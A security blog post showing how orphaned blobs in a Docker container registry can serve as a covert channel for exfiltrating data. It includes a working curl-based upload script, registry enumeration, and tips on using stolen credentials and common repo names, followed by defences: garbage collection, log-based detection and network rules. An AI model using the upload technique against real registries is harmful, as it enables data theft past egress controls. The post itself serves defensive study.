---
title: How To Abuse Container Repositories For Fun And Profit
date: 2021-10-23 12:00:00 -500
categories: [Containerization,Hacking]
tags: [containerization,docker,hacking,dlp,data exfiltration]
img_path: /assets/img/posts/
image:
  path: pexels-anete-lusina-5240543.jpg
  width: 1000
  height: 800
  alt: hacking
---
Often as security engineers we are worried about what vulnerabilites can be downloaded from container registries, howver i believe the same could be used to exfiltrate data.

We will go over what a container repository(sometimes referred to as a registry) is, the mechanisms and APIs used to communicate with them, and ultimately how to abuse the features to make a malicious file appear like a legitimate image layer to exfiltrate data.

# What is a Container Repository?
A container repository is a software component used to store and access container images. A container registry is a collection of container repositories, including mechanisms like authentication, authorization, and storage management. This can be simplified as a binary blob storage system with an API Frontend. It has two main processes, receiving a blob and receiving a manifest file that points to that blob. Because these processes are independent of each other you can use one or the other or both at the same time.

Therein lies the first issue, because these are independent processes the registry itself does not inherently know if a blob matches to a manifest or is orphaned. That means there can be a blob ( docker container layer) that was uploaded that has no matching manifest pointing to it and will just sit there in the repo until something comes along and removes it or points to it.

This means you can secretly use a container repository as a generic blob store, without your files ever showing up as a registry object.

Why would you do this and how? Well, it could lead to some cool projects such as a [container repository backed IRC server](https://twitter.com/hasheddan/status/1448783583523393536) handled by a docker image as the client and the repo as the server, each layer being the newer messages being pushed and pulled down. And we can see other use cases such as using [this tool](https://github.com/coollog/rocker) based on the features below to store any sort of file in a repo.

## Blob Storage(object storage).
Blob storage is really just a generic Object Storage solution but has been optimized and is ideal for storing massive amounts of unstructured data. Unstructured data is data that doesn't adhere to a particular data model or definition, such as text or binary data.

## Manifests
A container manifest or an image manifest is a file that contains information about an image. Such as the layers, size, and digest of that image.

Docker has built-in commands such as "docker manifest"  and "docker manifest inspect" that can help manage and inspect the contents of that manifest file. To make matters worse there are two versions of a docker container manifest schema, as well as a third option called a manifest list, which is like a manifest but it includes several different manifests of other images. [More info here](https://docs.docker.com/registry/spec/manifest-v2-2/)

<details>
  <summary>Manifest V2 Example</summary>

  {% highlight json %}
  {
    "schemaVersion": 2,
    "mediaType": "application/vnd.docker.distribution.manifest.v2+json",
    "config": {
        "mediaType": "application/vnd.docker.container.image.v1+json",
        "size": 7023,
        "digest": "sha256:b5b2b2c507a0944348e0303114d8d93aaaa081732b86451d9bce1f432a537bc7"
    },
    "layers": [
        {
            "mediaType": "application/vnd.docker.image.rootfs.diff.tar.gzip",
            "size": 32654,
            "digest": "sha256:e692418e4cbaf90ca69d05a66403747baa33ee08806650b51fab815ad7fc331f"
        },
        {
            "mediaType": "application/vnd.docker.image.rootfs.diff.tar.gzip",
            "size": 16724,
            "digest": "sha256:3c3a4604a545cdc127456d94e421cd355bca5b528f4a9c1905b15da2eb4a4c6b"
        },
        {
            "mediaType": "application/vnd.docker.image.rootfs.diff.tar.gzip",
            "size": 73109,
            "digest": "sha256:ec4b8955958665577945c89419d1af06b5f7636b4ac3da7f12184802ad867736"
        }
    ]
}
{% endhighlight %}
  
</details>

<details>
  <summary>Manifest List Example</summary>

  {% highlight json %}
{
  "schemaVersion": 2,
  "mediaType": "application/vnd.docker.distribution.manifest.list.v2+json",
  "manifests": [
    {
      "mediaType": "application/vnd.docker.distribution.manifest.v2+json",
      "size": 7143,
      "digest": "sha256:e692418e4cbaf90ca69d05a66403747baa33ee08806650b51fab815ad7fc331f",
      "platform": {
        "architecture": "ppc64le",
        "os": "linux",
      }
    },
    {
      "mediaType": "application/vnd.docker.distribution.manifest.v2+json",
      "size": 7682,
      "digest": "sha256:5b0bcabd1ed22e9fb1310cf6c2dec7cdef19f0ad69efa1f392e94a4333501270",
      "platform": {
        "architecture": "amd64",
        "os": "linux",
        "features": [
          "sse4"
        ]
      }
    }
  ]
}
{% endhighlight %}

</details>

# How to abuse a docker repository to exfiltrate data.
So, how can we use the above knowledge to abuse the configuration?

First, let's assume that you have write-access to the repository, and while having to write access to the repository opens you up to other attacks such as the ability to overwrite images, or a backdoor to trusted images, etc the scope will be tricking the manifest to make a malicious layer or file appear as a legitimate layer of the image. 

Also, container repositories are not protected by default, taking a look at a tool like [Shodan](https://shodan.io/) or googling for possible docker repositories will show many results for unprotected registries. 

So let's start by using the repo itself as an exfiltration channel, given that many network tools are not able to scan for blobs or generic binary files you can actually use the docker repository to exfiltrate data. And secondly by take a look at the repo as arbitrary blog storage in order for you to deliver your malware across an entire organization.

In this case, let's assume there is a network egress policy preventing from phoning home or sending data out of the org. Many organizations do however put container registries into their allow-lists. Because these are public-facing across several environments you should be able to upload data to the registry and then download it at a different location using your credentials or stolen credentials.


# How to make a malicious file appear like a legitimate image layer.
First let's take a look at what the directory structure looks like for a docker repository on the filesystem, below is an example of a docker repository I made following [these](https://docs.docker.com/registry/deploying/) instructions. As an FYI I used the local storage option but there are many [others](https://docs.docker.com/registry/configuration/#storage) to choose from S3, swift,gcs, and azure's blob storage to name a few.

This is what the repo looks like with just one image for simplicity, the more images the more blobs and repos there will be.

<details>
  <summary>Docker Registry Directory Structure for Ubuntu</summary>

{% highlight bash %}
/var/lib/registry/docker/registry/v2 # ls -R | grep ":$" | sed -e 's/:$//' -e 's/[^-][^\/]*\//--/g' -e 's/^/   /' -e 's/-/|/' #yes this looks ugly but i didnt have `tree` installed
   .
   |-blobs
   |---sha256
   |-----58
   |-------58690f9b18fca6469a14da4e212c96849469f9b1be6661d2342a4bf01774aa50
   |-----a3
   |-------a3785f78ab8547ae2710c89e627783cfa7ee7824d3468cae6835c9f4eae23ff7
   |-----b5
   |-------b51569e7c50720acf6860327847fe342a1afbe148d24c529fb81df105e3eed01
   |-----b6
   |-------b6f50765242581c887ff1acc2511fa2d885c52d8fb3ac8c4bba131fd86567f2e
   |-----da
   |-------da8ef40b9ecabc2679fe2419957220c0272a965c5cf7e0269fa1aeeb8c56f2e1
   |-----fb
   |-------fb15d46c38dcd1ea0b1990006c3366ecd10c79d374f341687eb2cb23a2c8672e
   |-repositories
   |---my-ubuntu
   |-----_layers
   |-------sha256
   |---------58690f9b18fca6469a14da4e212c96849469f9b1be6661d2342a4bf01774aa50
   |---------b51569e7c50720acf6860327847fe342a1afbe148d24c529fb81df105e3eed01
   |---------b6f50765242581c887ff1acc2511fa2d885c52d8fb3ac8c4bba131fd86567f2e
   |---------da8ef40b9ecabc2679fe2419957220c0272a965c5cf7e0269fa1aeeb8c56f2e1
   |---------fb15d46c38dcd1ea0b1990006c3366ecd10c79d374f341687eb2cb23a2c8672e
   |-----_manifests
   |-------revisions
   |---------sha256
   |-----------a3785f78ab8547ae2710c89e627783cfa7ee7824d3468cae6835c9f4eae23ff7
   |-------tags
   |---------latest
   |-----------current
   |-----------index
   |-------------sha256
   |---------------a3785f78ab8547ae2710c89e627783cfa7ee7824d3468cae6835c9f4eae23ff7
   |-----_uploads
{% endhighlight %}
  
</details>


Here we can see the blobs directory, currently hosting Docker Image layers, however, keep in mind it could be absolutely any type of file. Then we have the Repositories folder which contains metadata and link references to the blobs.

HOWEVER! there is no validation of any kind, the repository itself does not compare the image manifest to the blobs located in the blobs directory, and even though the docker image layers are all zip'ed files, it doesn't even verify the file format either. There is no input validation, header validation, or file type validation, nothing.

You could tell the docker registry API to upload any type of binary. As we're about to see below. (Although there are great tools out there for working with remote image registries such as [Skopeo](https://github.com/containers/skopeo), were just going to curl it directly that way we can run anywhere without any dependencies which makes it a perfect candidate for running on a vulnerable host.)

First, let's take a look at what the [documentation](https://docs.docker.com/registry/spec/api/#blob-upload) says we need here:

```bash
PUT /v2/<name>/blobs/uploads/<uuid>?digest=<digest>
Content-Length: <size of your content>
Content-Type: application/octet-stream
 
<your binary blob>
```

In order to recreate this, I wrote a bash script that would do this for me, this assumes you have a file locally called "ulises_superbad_file.txt" feel free to rename this to whatever file you want to upload.

```bash
[user@docker-registry ~]$ cat ulises_superbad_file.txt
TONS OF BAD STUFF IN HERE
```

```bash
#! /bin/bash
reponame=my-ubuntu
uploadURL=$(curl -siL -X POST "10.0.1.68:5000/v2/$reponame/blobs/uploads/" | grep 'Location:' | cut -d ' ' -f 2 | tr -d '[:space:]')
blobDigest="sha256:$(sha256sum ulises_superbad_file.txt | cut -d ' ' -f 1)"
curl -T ulises_superbad_file.txt --progress-bar "$uploadURL&digest=$blobDigest" > /dev/null
```

After running it we can see that there is a new layer in blobs!

<details>
  <summary>Docker Registry Directory Structure for Ubuntu showing the new layer</summary>
  
  {% highlight bash %}
  /var/lib/registry/docker/registry/v2 # ls -R | grep ":$" | sed -e 's/:$//' -e 's/[^-][^\/]*\//--/g' -e 's/^/   /' -e 's/-/|/'
   .
   |-blobs
   |---sha256
   |-----46
   |-------4663e1a25d7f857db2dc2d18269aab7f2ca5ed1f482525de9e68ef14dc097dbf  # <---- OUR BAD LAYER!!!
   |-----58
   |-------58690f9b18fca6469a14da4e212c96849469f9b1be6661d2342a4bf01774aa50
   |-----a3
   |-------a3785f78ab8547ae2710c89e627783cfa7ee7824d3468cae6835c9f4eae23ff7
   |-----b5
   |-------b51569e7c50720acf6860327847fe342a1afbe148d24c529fb81df105e3eed01
   |-----b6
   |-------b6f50765242581c887ff1acc2511fa2d885c52d8fb3ac8c4bba131fd86567f2e
   |-----da
   |-------da8ef40b9ecabc2679fe2419957220c0272a965c5cf7e0269fa1aeeb8c56f2e1
   |-----fb
   |-------fb15d46c38dcd1ea0b1990006c3366ecd10c79d374f341687eb2cb23a2c8672e
   |---uploads
   |-repositories
   |---my-ubuntu
   |-----_layers
   |-------sha256
   |---------4663e1a25d7f857db2dc2d18269aab7f2ca5ed1f482525de9e68ef14dc097dbf
   |---------58690f9b18fca6469a14da4e212c96849469f9b1be6661d2342a4bf01774aa50
   |---------b51569e7c50720acf6860327847fe342a1afbe148d24c529fb81df105e3eed01
   |---------b6f50765242581c887ff1acc2511fa2d885c52d8fb3ac8c4bba131fd86567f2e
   |---------da8ef40b9ecabc2679fe2419957220c0272a965c5cf7e0269fa1aeeb8c56f2e1
   |---------fb15d46c38dcd1ea0b1990006c3366ecd10c79d374f341687eb2cb23a2c8672e
   |-----_manifests
   |-------revisions
   |---------sha256
   |-----------a3785f78ab8547ae2710c89e627783cfa7ee7824d3468cae6835c9f4eae23ff7
   |-------tags
   |---------latest
   |-----------current
   |-----------index
   |-------------sha256
   |---------------a3785f78ab8547ae2710c89e627783cfa7ee7824d3468cae6835c9f4eae23ff7
   |-----_uploads
   |-------69c54205-5f65-4319-8f73-ae3868970f75
   |---------hashstates
   |-----------sha256
   |-------b3e5b11b-a3aa-4cd4-8730-4ae9b11cc4e4
   |---------hashstates
   |-----------sha256
   |-------e7adae40-331d-4532-8c35-516a8a5f698e
   |---------hashstates
   |-----------sha256
   {% endhighlight %}
</details>

Catting out that file will show that we have successfully exfiltrated using the docker registry API! And as you can see we did not overwrite any layer or repo, just adding to where the blob gets stored.

```bash
/var/lib/registry/docker/registry/v2 # cat blobs/sha256/46/4663e1a25d7f857db2dc2d18269aab7f2ca5ed1f482525de9e68ef14dc097dbf/data
TONS OF BAD STUFF IN HERE
```
In the above example, I put it into my my-ubuntu repo, ideally, you could replace this with any repo name, the more common the better.

To find out what repos exists just run the following and you will get back the list of repositories in the registry.
```bash
[user@docker-registry ~]$ curl -X GET 10.0.1.68:5000/v2/_catalog
{"repositories":["my-ubuntu"]}
```
# Defending Against the Dark Arts
So how can we defend against this type of attack? It starts with proper authorization, this type of attack is only possible because the user would have access to write to any repo in the registry.

However, there are two main things we can do to defend against this if our authorization controls were to fail.

## Garbage Collection
[Garbage collection](https://docs.docker.com/registry/garbage-collection/) is the biggest control we can add here. What garbage collection does is, remove blobs from the filesystem when they are no longer referenced by a manifest. As of v2.4.0, a garbage collector command is included within the registry binary. Garbage collection runs in two phases. First, in the ‘mark’ phase, the process scans all the manifests in the registry. From these manifests, it constructs a set of content address digests. This set is the ‘mark set’ and denotes the set of blobs to not delete. Secondly, in the ‘sweep’ phase, the process scans all the blobs and if a blob’s content address digest is not in the mark set, the process deletes it. One caveat with this is that you should ensure that the registry is in read-only mode or not running at all. If you were to upload an image while garbage collection is running, there is the risk that the image’s layers are mistakenly deleted leading to a corrupted image.

To run the garbage collection binary, you would run it as follows(ideally in some sort of cron or automated way), the dry-run option can be used to see what will be deleted. And you will need a yml file that tells it what registry to look into.
  
```bash
bin/registry garbage-collect [--dry-run] /path/to/config.yml
```
  
<details>
  <summary>To find your rootdirectory for your yaml file run this</summary>

  {% highlight bash %}
# cat /etc/docker/registry/config.yml
version: 0.1
log:
  fields:
    service: registry
storage:
  cache:
    blobdescriptor: inmemory
  filesystem:
    rootdirectory: /var/lib/registry
http:
  addr: :5000
  headers:
    X-Content-Type-Options: [nosniff]
health:
  storagedriver:
    enabled: true
    interval: 10s
    threshold: 3
  {% endhighlight %}
  
</details>

<details>
  <summary>deletebadstuff.yml</summary>

  {% highlight yml %}
version: 0.1
storage:
  filesystem:
    rootdirectory: /var/lib/registry
  {% endhighlight %}
  
</details>

Here we ran the command and found the blob I uploaded and removed it.

```bash
/etc/docker/registry # registry garbage-collect /etc/docker/registry/deletebadstuff.yml
my-ubuntu
my-ubuntu: marking manifest sha256:a3785f78ab8547ae2710c89e627783cfa7ee7824d3468cae6835c9f4eae23ff7
my-ubuntu: marking blob sha256:b6f50765242581c887ff1acc2511fa2d885c52d8fb3ac8c4bba131fd86567f2e
my-ubuntu: marking blob sha256:58690f9b18fca6469a14da4e212c96849469f9b1be6661d2342a4bf01774aa50
my-ubuntu: marking blob sha256:b51569e7c50720acf6860327847fe342a1afbe148d24c529fb81df105e3eed01
my-ubuntu: marking blob sha256:da8ef40b9ecabc2679fe2419957220c0272a965c5cf7e0269fa1aeeb8c56f2e1
my-ubuntu: marking blob sha256:fb15d46c38dcd1ea0b1990006c3366ecd10c79d374f341687eb2cb23a2c8672e
 
6 blobs marked, 1 blobs and 0 manifests eligible for deletion
blob eligible for deletion: sha256:4663e1a25d7f857db2dc2d18269aab7f2ca5ed1f482525de9e68ef14dc097dbf
INFO[0000] Deleting blob: /docker/registry/v2/blobs/sha256/46/4663e1a25d7f857db2dc2d18269aab7f2ca5ed1f482525de9e68ef14dc097dbf  go.version=go1.11.2 instance.id=7ae297a0-9007-45a9-95c8-1d7e83dcc634
```
Many modern containerization registries come with some sort of garbage collecting by default such as [Azure's Container Registry](https://azure.microsoft.com/en-us/services/container-registry/), [GitLab's Container Registry](https://docs.gitlab.com/ee/user/packages/container_registry/), and [Harbor](https://goharbor.io/). However most of the time these features are not turned on by default.

## Logging
Because we are using the API legitimately, that means that we are able to see all the API calls in the logs, as you can see below this is what regular traffic looks like many calls with GET, HEAD, and POST methods.
  
```bash
192.168.40.1 - - [22/Oct/2021:22:34:59 +0000] "GET /v2/ HTTP/1.1" 200 2 "" "docker/17.06.0-ce go/go1.8.3 git-commit/02c1d87 kernel/3.10.0-1127.el7.x86_64 os/linux arch/amd64 UpstreamClient(Docker-Client/17.06.0-ce \\(linux\\))"
time="2021-10-22T22:34:59.838542408Z" level=error msg="response completed with error" err.code="blob unknown" err.detail=sha256:da8ef40b9ecabc2679fe2419957220c0272a965c5cf7e0269fa1aeeb8c56f2e1 err.message="blob unknown to registry" go.version=go1.11.2 http.request.host="localhost:5000" http.request.id=c6748305-21fd-4bad-a5bc-f76f58dfa078 http.request.method=HEAD http.request.remoteaddr="192.168.40.1:60128" http.request.uri="/v2/my-ubuntu/blobs/sha256:da8ef40b9ecabc2679fe2419957220c0272a965c5cf7e0269fa1aeeb8c56f2e1" http.request.useragent="docker/17.06.0-ce go/go1.8.3 git-commit/02c1d87 kernel/3.10.0-1127.el7.x86_64 os/linux arch/amd64 UpstreamClient(Docker-Client/17.06.0-ce \(linux\))" http.response.contenttype="application/json; charset=utf-8" http.response.duration=6.09934ms http.response.status=404 http.response.written=157 vars.digest="sha256:da8ef40b9ecabc2679fe2419957220c0272a965c5cf7e0269fa1aeeb8c56f2e1" vars.name=my-ubuntu
192.168.40.1 - - [22/Oct/2021:22:34:59 +0000] "HEAD /v2/my-ubuntu/blobs/sha256:b51569e7c50720acf6860327847fe342a1afbe148d24c529fb81df105e3eed01 HTTP/1.1" 404 157 "" "docker/17.06.0-ce go/go1.8.3 git-commit/02c1d87 kernel/3.10.0-1127.el7.x86_64 os/linux arch/amd64 UpstreamClient(Docker-Client/17.06.0-ce \\(linux\\))"
192.168.40.1 - - [22/Oct/2021:22:34:59 +0000] "HEAD /v2/my-ubuntu/blobs/sha256:fb15d46c38dcd1ea0b1990006c3366ecd10c79d374f341687eb2cb23a2c8672e HTTP/1.1" 404 157 "" "docker/17.06.0-ce go/go1.8.3 git-commit/02c1d87 kernel/3.10.0-1127.el7.x86_64 os/linux arch/amd64 UpstreamClient(Docker-Client/17.06.0-ce \\(linux\\))"
192.168.40.1 - - [22/Oct/2021:22:34:59 +0000] "HEAD /v2/my-ubuntu/blobs/sha256:58690f9b18fca6469a14da4e212c96849469f9b1be6661d2342a4bf01774aa50 HTTP/1.1" 404 157 "" "docker/17.06.0-ce go/go1.8.3 git-commit/02c1d87 kernel/3.10.0-1127.el7.x86_64 os/linux arch/amd64 UpstreamClient(Docker-Client/17.06.0-ce \\(linux\\))"
time="2021-10-22T22:34:59.862855296Z" level=info msg="response completed" go.version=go1.11.2 http.request.host="localhost:5000" http.request.id=90bcd815-28e4-4b10-88eb-7776c67cf385 http.request.method=POST http.request.remoteaddr="192.168.40.1:60136" http.request.uri="/v2/my-ubuntu/blobs/uploads/" http.request.useragent="docker/17.06.0-ce go/go1.8.3 git-commit/02c1d87 kernel/3.10.0-1127.el7.x86_64 os/linux arch/amd64 UpstreamClient(Docker-Client/17.06.0-ce \(linux\))" http.response.duration=27.498841ms http.response.status=202 http.response.written=0
192.168.40.1 - - [22/Oct/2021:22:34:59 +0000] "HEAD /v2/my-ubuntu/blobs/sha256:da8ef40b9ecabc2679fe2419957220c0272a965c5cf7e0269fa1aeeb8c56f2e1 HTTP/1.1" 404 157 "" "docker/17.06.0-ce go/go1.8.3 git-commit/02c1d87 kernel/3.10.0-1127.el7.x86_64 os/linux arch/amd64 UpstreamClient(Docker-Client/17.06.0-ce \\(linux\\))"
192.168.40.1 - - [22/Oct/2021:22:34:59 +0000] "POST /v2/my-ubuntu/blobs/uploads/ HTTP/1.1" 202 0 "" "docker/17.06.0-ce go/go1.8.3 git-commit/02c1d87 kernel/3.10.0-1127.el7.x86_64 os/linux arch/amd64 UpstreamClient(Docker-Client/17.06.0-ce \\(linux\\))"
```

Here where we are uploading my blob through the API you can see that it's mostly POST and PUTS, with no HEAD or GETS methods. We should be able to train our SIEM to look for this sort of pattern and alert us when this happens.
```bash
10.0.1.68 - - [23/Oct/2021:02:35:14 +0000] "POST /v2/my-ubuntu/blobs/uploads/ HTTP/1.1" 202 0 "" "curl/7.68.0"
time="2021-10-23T02:35:14.697725865Z" level=error msg="response completed with error" err.code="digest invalid" err.detail="digest parsing failed" err.message="provided digest did not match uploaded content" go.version=go1.11.2 http.request.host="10.0.1.68:5000" http.request.id=c1b2df8e-2235-474e-a8ae-a4e9b0144366 http.request.method=PUT http.request.remoteaddr="10.0.1.68:46056" http.request.uri="/v2/my-ubuntu/blobs/uploads/69c54205-5f65-4319-8f73-ae3868970f75?_state=IAwESRbw7yI8SSgXKwXcC8acbxyao7VYfyzJGk_vFgZ7Ik5hbWUiOiJteS11YnVudHUiLCJVVUlEIjoiNjljNTQyMDUtNWY2NS00MzE5LThmNzMtYWUzODY4OTcwZjc1IiwiT2Zmc2V0IjowLCJTdGFydGVkQXQiOiIyMDIxLTEwLTIzVDAyOjM1OjE0LjY2OTU3OTQwMloifQ%3D%3D&digest=4663e1a25d7f857db2dc2d18269aab7f2ca5ed1f482525de9e68ef14dc097dbf" http.request.useragent="curl/7.68.0" http.response.contenttype="application/json; charset=utf-8" http.response.duration=4.274777ms http.response.status=400 http.response.written=131 vars.name=my-ubuntu vars.uuid=69c54205-5f65-4319-8f73-ae3868970f75
10.0.1.68 - - [23/Oct/2021:02:35:14 +0000] "PUT /v2/my-ubuntu/blobs/uploads/69c54205-5f65-4319-8f73-ae3868970f75?_state=IAwESRbw7yI8SSgXKwXcC8acbxyao7VYfyzJGk_vFgZ7Ik5hbWUiOiJteS11YnVudHUiLCJVVUlEIjoiNjljNTQyMDUtNWY2NS00MzE5LThmNzMtYWUzODY4OTcwZjc1IiwiT2Zmc2V0IjowLCJTdGFydGVkQXQiOiIyMDIxLTEwLTIzVDAyOjM1OjE0LjY2OTU3OTQwMloifQ%3D%3D&digest=4663e1a25d7f857db2dc2d18269aab7f2ca5ed1f482525de9e68ef14dc097dbf HTTP/1.1" 400 131 "" "curl/7.68.0"
10.0.1.68 - - [23/Oct/2021:02:37:56 +0000] "POST /v2/my-ubuntu/blobs/uploads/ HTTP/1.1" 202 0 "" "curl/7.68.0"
time="2021-10-23T02:37:56.666705903Z" level=info msg="response completed" go.version=go1.11.2 http.request.host="10.0.1.68:5000" http.request.id=4f5d3d80-7239-4b49-ba04-dc99cce91017 http.request.method=POST http.request.remoteaddr="10.0.1.68:46058" http.request.uri="/v2/my-ubuntu/blobs/uploads/" http.request.useragent="curl/7.68.0" http.response.duration=5.900598ms http.response.status=202 http.response.written=0
10.0.1.68 - - [23/Oct/2021:02:37:56 +0000] "PUT /v2/my-ubuntu/blobs/uploads/c4c17c99-a34b-4823-8e2f-d44388fd14e7?_state=q8GBvxM4lqcwqZdeq7mJLo4GYSJ5ViYXRdaYBu-fv057Ik5hbWUiOiJteS11YnVudHUiLCJVVUlEIjoiYzRjMTdjOTktYTM0Yi00ODIzLThlMmYtZDQ0Mzg4ZmQxNGU3IiwiT2Zmc2V0IjowLCJTdGFydGVkQXQiOiIyMDIxLTEwLTIzVDAyOjM3OjU2LjY2MjQwNDg5MVoifQ%3D%3D&digest=sha256:4663e1a25d7f857db2dc2d18269aab7f2ca5ed1f482525de9e68ef14dc097dbf HTTP/1.1" 201 0 "" "curl/7.68.0"
time="2021-10-23T02:37:56.682175203Z" level=info msg="response completed" go.version=go1.11.2 http.request.host="10.0.1.68:5000" http.request.id=1354f16b-7940-4ad3-ac4b-c42b54fdafdb http.request.method=PUT http.request.remoteaddr="10.0.1.68:46060" http.request.uri="/v2/my-ubuntu/blobs/uploads/c4c17c99-a34b-4823-8e2f-d44388fd14e7?_state=q8GBvxM4lqcwqZdeq7mJLo4GYSJ5ViYXRdaYBu-fv057Ik5hbWUiOiJteS11YnVudHUiLCJVVUlEIjoiYzRjMTdjOTktYTM0Yi00ODIzLThlMmYtZDQ0Mzg4ZmQxNGU3IiwiT2Zmc2V0IjowLCJTdGFydGVkQXQiOiIyMDIxLTEwLTIzVDAyOjM3OjU2LjY2MjQwNDg5MVoifQ%3D%3D&digest=sha256:4663e1a25d7f857db2dc2d18269aab7f2ca5ed1f482525de9e68ef14dc097dbf" http.request.useragent="curl/7.68.0" http.response.duration=5.954959ms http.response.status=201 http.response.written=0
```
## Network
Likewise at our network layet, either in our WAF's or Firewalss we hould be validating that we can only push to our own internal container repositories and never an external one. 

# Resources
- https://docs.docker.com/registry/spec/api/#blob-upload
- https://github.com/distribution/distribution/issues/2867
- https://docs.docker.com/registry/spec/api/
